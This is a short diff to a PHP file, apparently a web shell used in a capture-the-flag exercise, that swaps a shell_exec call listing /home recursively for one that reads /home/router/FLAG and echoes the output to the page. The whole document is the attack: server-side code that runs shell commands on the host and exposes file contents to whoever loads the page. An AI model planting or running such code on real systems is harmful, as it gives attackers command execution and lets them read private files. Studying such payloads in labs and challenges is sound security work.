@@ -1,4 +1,4 @@
 <?php
-$output = shell_exec("ls -R /home"); 
+$output = shell_exec("cat /home/router/FLAG"); 
 echo "<pre>$output</pre>";
 ?>
